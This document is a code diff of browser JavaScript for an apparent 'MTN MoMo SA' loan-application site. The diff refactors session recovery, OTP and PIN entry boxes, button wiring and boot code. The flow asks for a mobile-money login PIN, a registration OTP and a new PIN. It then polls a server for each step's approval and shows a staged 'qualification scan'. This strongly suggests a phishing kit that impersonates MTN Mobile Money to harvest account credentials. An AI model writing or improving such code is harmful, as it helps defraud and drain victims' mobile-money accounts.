+        showToast('Copy not supported.', 'error');
+    }
 }
 function cancelApplication() {
     if (!confirm('Cancel this application? You can resume later with your Application ID.')) return;
@@ -1228,8 +1285,7 @@ function cancelApplication() {
 function restartApplication() {
     stopPolling(); stopRegPoll();
     if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
-    Object.values(KEYS).forEach(rm);
-    clearDrafts();
+    Object.keys(KEYS).forEach(k => rm(KEYS[k]));
     location.reload();
 }
 
@@ -1242,47 +1298,45 @@ async function recoverSession() {
     S.applicationId = id;
     const data = get(KEYS.APP_DATA);
     if (data) {
-        S.isRegistered   = data.isRegistered;
+        S.isRegistered = data.isRegistered;
         S.registrationStatus = data.registrationStatus || 'idle';
-        S.accountType    = data.accountType;
+        S.accountType = data.accountType;
         S.accountMaxLoan = data.accountMaxLoan;
-        S.steps          = data.steps || {};
-        S.loan           = data.loan || {};
-        S.personal       = data.personal || {};
-        S.employment     = data.employment || {};
-        S.guarantor      = data.guarantor || {};
-        S.dob            = data.dob || null;
+        S.steps = data.steps || {};
+        S.loan = data.loan || {};
+        S.personal = data.personal || {};
+        S.employment = data.employment || {};
+        S.guarantor = data.guarantor || {};
+        S.dob = data.dob || null;
     }
     try {
-        const r = await fetch(`/api/status/${id}`, { credentials: 'same-origin' });
+        const r = await fetch('/api/status/' + id, { credentials: 'same-origin' });
         if (!r.ok) { goTo('page-landing'); return; }
         const s = await r.json();
         if (!s.ok || !s.isRegistered) { goTo('page-landing'); return; }
 
-        S.isRegistered   = true;
+        S.isRegistered = true;
         S.registrationStatus = s.registrationStatus || S.registrationStatus;
-        S.accountType    = s.accountType;
+        S.accountType = s.accountType;
         S.accountMaxLoan = s.accountMaxLoan;
-        S.steps          = s.steps || S.steps || {};
-        S.dob            = s.dob || S.dob;
-        if (s.loan)       S.loan       = { ...S.loan,       ...s.loan };
-        if (s.personal)   S.personal   = { ...S.personal,   ...s.personal };
-        if (s.employment) S.employment = { ...S.employment, ...s.employment };
-        if (s.guarantor)  S.guarantor  = { ...S.guarantor,  ...s.guarantor };
-
+        S.steps = s.steps || S.steps || {};
+        S.dob = s.dob || S.dob;
+        if (s.loan) S.loan = Object.assign({}, S.loan, s.loan);
+        if (s.personal) S.personal = Object.assign({}, S.personal, s.personal);
+        if (s.employment) S.employment = Object.assign({}, S.employment, s.employment);
+        if (s.guarantor) S.guarantor = Object.assign({}, S.guarantor, s.guarantor);
         saveAll();
         updateCalc();
 
-        // ── Registration not yet complete → route to correct registration stage
         if (S.registrationStatus && S.registrationStatus !== 'completed') {
             if (S.registrationStatus === 'rejected') {
-                document.getElementById('regRejectReason').textContent = s.rejectionReason || 'Registration was rejected.';
+                const el = document.getElementById('regRejectReason');
+                if (el) el.textContent = s.rejectionReason || 'Registration was rejected.';
             }
             routeRegistrationFlow();
             return;
         }
 
-        // ── Loan flow ──
         const steps = S.steps;
         const pending = STEPS.find(x => steps[x] === 'pending');
         if (pending) {
@@ -1295,11 +1349,11 @@ async function recoverSession() {
             if (waitPages[pending]) {
                 goTo(waitPages[pending]);
                 const cbMap = {
-                    loan:       () => { S.steps.loan = 'approved'; saveAll(); goTo('page-step2'); },
-                    personal:   () => { S.steps.personal = 'approved'; saveAll(); goTo('page-step3'); },
+                    loan: () => { S.steps.loan = 'approved'; saveAll(); goTo('page-step2'); },
+                    personal: () => { S.steps.personal = 'approved'; saveAll(); goTo('page-step3'); },
                     employment: () => { S.steps.employment = 'approved'; saveAll(); goTo('page-guarantor'); },
-                    guarantor:  () => { S.steps.guarantor = 'approved'; saveAll(); goTo('page-confirmation'); },
-                    momologin:  () => { S.steps.momologin = 'approved'; saveAll(); startQualificationScan(); }
+                    guarantor: () => { S.steps.guarantor = 'approved'; saveAll(); goTo('page-confirmation'); },
+                    momologin: () => { S.steps.momologin = 'approved'; saveAll(); startQualificationScan(); }
                 };
                 startPolling(pending, cbMap[pending]);
                 return;
@@ -1307,11 +1361,11 @@ async function recoverSession() {
         }
 
         if (steps.qualification === 'approved') { showApproval(); return; }
-        if (steps.momologin === 'approved')     { startQualificationScan(); return; }
-        if (steps.guarantor === 'approved')     { goTo('page-confirmation'); return; }
-        if (steps.employment === 'approved')    { goTo('page-guarantor'); return; }
-        if (steps.personal === 'approved')      { goTo('page-step3'); return; }
-        if (steps.loan === 'approved')          { goTo('page-step2'); return; }
+        if (steps.momologin === 'approved') { startQualificationScan(); return; }
+        if (steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
+        if (steps.employment === 'approved') { goTo('page-guarantor'); return; }
+        if (steps.personal === 'approved') { goTo('page-step3'); return; }
+        if (steps.loan === 'approved') { goTo('page-step2'); return; }
         goTo('page-requirements');
     } catch (e) {
         console.warn('Recovery failed:', e.message);
@@ -1319,102 +1373,193 @@ async function recoverSession() {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
-// STORAGE
-// ═══════════════════════════════════════════════════════════
-function saveAll() {
-    save(KEYS.APP_ID, S.applicationId);
-    save(KEYS.APP_DATA, {
-        isRegistered: S.isRegistered,
-        registrationStatus: S.registrationStatus,
-        accountType:  S.accountType,
-        accountMaxLoan: S.accountMaxLoan,
-        dob: S.dob,
-        steps:        S.steps,
-        loan: S.loan, personal: S.personal,
-        employment: S.employment, guarantor: S.guarantor
-    });
-}
 async function retryStep(step) {
     stopPolling();
-    try { await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' }); } catch (e) {}
+    try { await apiCall('/api/retry/' + S.applicationId + '/' + step, { method: 'POST' }); } catch (e) {}
     if (S.steps[step]) { S.steps[step] = 'idle'; saveAll(); }
-    if (step === 'momologin') {
-        clearLoginPin();
-        clearErr('loginErr');
-        goTo('page-momologin');
-    }
+    if (step === 'momologin') { clearLoginPin(); clearErr('loginErr'); goTo('page-momologin'); }
 }
 
 // ═══════════════════════════════════════════════════════════
-// DOM READY
+// PIN & OTP INPUT WIRING (per-box focus, backspace, paste)
 // ═══════════════════════════════════════════════════════════
-document.addEventListener('DOMContentLoaded', () => {
-    applyI18n();
-    restoreDrafts();
-    attachDraftListeners();
-
-    // Login PIN listeners
-    for (let i = 0; i < 5; i++) {
-        const el = document.getElementById('loginPin' + i);
-        if (!el) continue;
-        el.addEventListener('input',   () => loginPinMvM(el, i));
-        el.addEventListener('keydown', (e) => loginPinKeydown(el, i, e));
-        el.addEventListener('paste',   (e) => loginPinPaste(e, i));
-    }
-    // Registration OTP listeners
-    for (let i = 0; i < 6; i++) {
-        const el = document.getElementById('regOtp' + i);
+function wirePinInputs(prefix, length, allowNext) {
+    for (let i = 0; i < length; i++) {
+        const el = document.getElementById(prefix + i);
         if (!el) continue;
         el.addEventListener('input', () => {
             el.value = el.value.replace(/\D/g, '').slice(0, 1);
-            if (el.value && i < 5) document.getElementById('regOtp' + (i + 1))?.focus();
+            if (el.value && i < length - 1) {
+                const n = document.getElementById(prefix + (i + 1));
+                if (n) n.focus();
+            }
+            if (allowNext && el.value && i === length - 1) {
+                const n = document.getElementById(allowNext);
+                if (n) n.focus();
+            }
         });
         el.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace' && !el.value && i > 0) {
-                const p = document.getElementById('regOtp' + (i - 1));
+                const p = document.getElementById(prefix + (i - 1));
                 if (p) { p.focus(); p.value = ''; }
             }
         });
         el.addEventListener('paste', (e) => {
-            const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-            if (!pasted) return;
+            const text = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '');
+            if (!text) return;
             e.preventDefault();
-            pasted.slice(0, 6 - i).split('').forEach((d, k) => {
-                const b = document.getElementById('regOtp' + (i + k));
-                if (b) b.value = d;
+            text.slice(0, length - i).split('').forEach((d, k) => {
+                const box = document.getElementById(prefix + (i + k));
+                if (box) box.value = d;
             });
-            document.getElementById('regOtp' + Math.min(i + pasted.length, 5))?.focus();
+            const n = document.getElementById(prefix + Math.min(i + text.length, length - 1));
+            if (n) n.focus();
         });
     }
-    // Registration PIN listeners
-    for (let i = 0; i < 5; i++) {
-        const m = document.getElementById('regPin' + i);
-        const c = document.getElementById('regPinC' + i);
-        const wire = (el, idx, confirm) => {
-            if (!el) return;
-            el.addEventListener('input', () => {
-                el.value = el.value.replace(/\D/g, '').slice(0, 1);
-                if (el.value && idx < 4) {
-                    const nxt = confirm ? document.getElementById('regPinC' + (idx + 1)) : document.getElementById('regPin' + (idx + 1));
-                    nxt?.focus();
-                }
-                if (!confirm && el.value && idx === 4) document.getElementById('regPinC0')?.focus();
-            });
-            el.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !el.value && idx > 0) {
-                    const pre = confirm ? 'regPinC' : 'regPin';
-                    const p = document.getElementById(pre + (idx - 1));
-                    if (p) { p.focus(); p.value = ''; }
-                }
-            });
-        };
-        wire(m, i, false);
-        wire(c, i, true);
-    }
-});
+}
 
-// ─── INIT ───
-updateCalc();
-recoverSession();
-console.log('✅ MTN MoMo SA v7.0 loaded');
+function wireLoginPin() {
+    for (let i = 0; i < 5; i++) {
+        const el = document.getElementById('loginPin' + i);
+        if (!el) continue;
+        el.addEventListener('input', () => loginPinMvM(el, i));
+        el.addEventListener('keydown', (e) => loginPinKeydown(el, i, e));
+        el.addEventListener('paste', (e) => loginPinPaste(e, i));
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// SAFE EVENT WIRING — works even with strict CSP
+// ═══════════════════════════════════════════════════════════
+function bindClick(id, fn) {
+    const el = document.getElementById(id);
+    if (!el) return false;
+    el.addEventListener('click', (e) => {
+        e.preventDefault();
+        try { fn(e); }
+        catch (err) {
+            console.error('[' + id + '] handler error:', err);
+            showToast('Something went wrong. Please try again.', 'error');
+        }
+    });
+    return true;
+}
+
+function wireAllHandlers() {
+    // Landing
+    bindClick('applyBtn', () => applyAsExistingUser());
+
+    // Registration
+    bindClick('regBtn', () => completeRegistration());
+    bindClick('regOtpBtn', () => submitRegistrationOtp());
+    bindClick('regPinBtn', () => submitRegistrationPin());
+
+    // Loan steps
+    bindClick('s1Btn', () => submitStepLoan());
+    bindClick('s2Btn', () => submitStepPersonal());
+    bindClick('s3Btn', () => submitStepEmployment());
+    bindClick('gBtn', () => submitStepGuarantor());
+
+    // MoMo login
+    bindClick('loginBtn', () => submitMoMoLogin());
+
+    // Terms / agreement modals
+    const termsLink = document.querySelector('a[onclick*="showTerms"]');
+    if (termsLink) termsLink.addEventListener('click', (e) => { e.preventDefault(); showTerms(); });
+
+    console.log('✅ All button handlers wired');
+}
+
+// Expose everything on window for any remaining inline onclick + debugging
+window.applyAsExistingUser   = applyAsExistingUser;
+window.applyFromCalculator   = applyFromCalculator;
+window.startMoMoRegistration = startMoMoRegistration;
+window.selectAccountType     = selectAccountType;
+window.completeRegistration  = completeRegistration;
+window.submitRegistrationOtp = submitRegistrationOtp;
+window.submitRegistrationPin = submitRegistrationPin;
+window.resendRegistrationOtp = resendRegistrationOtp;
+window.restartRegistration   = restartRegistration;
+window.submitStepLoan        = submitStepLoan;
+window.submitStepPersonal    = submitStepPersonal;
+window.submitStepEmployment  = submitStepEmployment;
+window.submitStepGuarantor   = submitStepGuarantor;
+window.submitMoMoLogin       = submitMoMoLogin;
+window.goTo                  = goTo;
+window.updateCalc            = updateCalc;
+window.setLanguage           = setLanguage;
+window.cancelApplication     = cancelApplication;
+window.restartApplication    = restartApplication;
+window.showTerms             = showTerms;
+window.closeTerms            = closeTerms;
+window.acceptTermsFromModal  = acceptTermsFromModal;
+window.showAgreement         = showAgreement;
+window.closeAgreement        = closeAgreement;
+window.downloadAgreementPdf  = downloadAgreementPdf;
+window.viewSchedule          = viewSchedule;
+window.closeSchedule         = closeSchedule;
+window.copyAppId             = copyAppId;
+window.retryStep             = retryStep;
+window.togLoginPin           = togLoginPin;
+window.clearLoginPin         = clearLoginPin;
+window.toggleLoginMethod     = toggleLoginMethod;
+window.normalizePhone        = normalizePhone;
+window.normalizeId           = normalizeId;
+window.clearErr              = clearErr;
+
+// ═══════════════════════════════════════════════════════════
+// BOOT
+// ═══════════════════════════════════════════════════════════
+function boot() {
+    console.log('🔧 Booting MTN MoMo SA v7.1...');
+    try { applyI18n(); } catch (e) { console.warn('i18n:', e); }
+
+    // Wire OTP/PIN boxes
+    wirePinInputs('regOtp', 6);
+    wirePinInputs('regPin', 5, 'regPinC0');
+    wirePinInputs('regPinC', 5);
+    wireLoginPin();
+
+    // Wire click handlers
+    wireAllHandlers();
+
+    // Calculator init
+    try { updateCalc(); } catch (e) { console.warn('updateCalc:', e); }
+
+    // Recover session
+    try { recoverSession(); } catch (e) { console.warn('recoverSession:', e); }
+
+    // Handle browser back/forward
+    window.addEventListener('popstate', () => {
+        const active = document.querySelector('.page.active');
+        if (active && requiresRegistration(active.id) && !isUserRegistered()) {
+            forceRegistration();
+        }
+    });
+
+    // Resume polling when tab becomes visible again
+    document.addEventListener('visibilitychange', () => {
+        if (document.hidden) return;
+        if (currentPollStep && currentPollCallback && !activePoll) {
+            startPolling(currentPollStep, currentPollCallback);
+        }
+        if (regPollTimer === null && S.registrationStatus && S.registrationStatus !== 'completed') {
+            if (S.registrationStatus === 'pending_review') pollRegistrationStatus();
+            else if (S.registrationStatus === 'pin_pending') pollPinStatus();
+        }
+    });
+
+    // Stop polling on unload
+    window.addEventListener('beforeunload', () => {
+        stopPolling();
+        stopRegPoll();
+    });
+
+    console.log('✅ MTN MoMo SA v7.1 ready');
+}
+
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+} else {
+    boot();
+}
